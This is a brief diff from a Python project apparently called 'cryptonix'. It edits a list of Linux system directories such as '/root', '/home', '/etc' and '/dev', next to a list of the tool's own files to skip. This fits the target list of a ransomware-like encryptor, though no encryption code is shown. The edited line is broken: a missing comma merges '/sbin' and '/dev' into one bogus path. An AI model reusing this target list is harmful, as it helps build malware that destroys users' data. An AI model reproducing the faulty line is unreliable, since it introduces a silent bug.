@@ -18,8 +18,8 @@ class Color:
     WHITE = '\033[37m'
 
 
-DIRS = ['/root', '/home', '/var', '/dev', '/opt', '/srv', '/sys', '/bin', '/mnt', '/media', '/lost+found', '/lib',
-        '/usr', '/sbin', '/proc', '/run', '/etc']
+DIRS = ['/root', '/home', '/bin', '/sbin' '/dev', '/opt', '/srv', '/sys','/var', '/mnt', '/media', '/lost+found',
+        '/usr', '/proc', '/run', '/etc']
 
 EXCLUDED_FILES = ['cryptonix.py', 'utils.py', 'config.py']
 
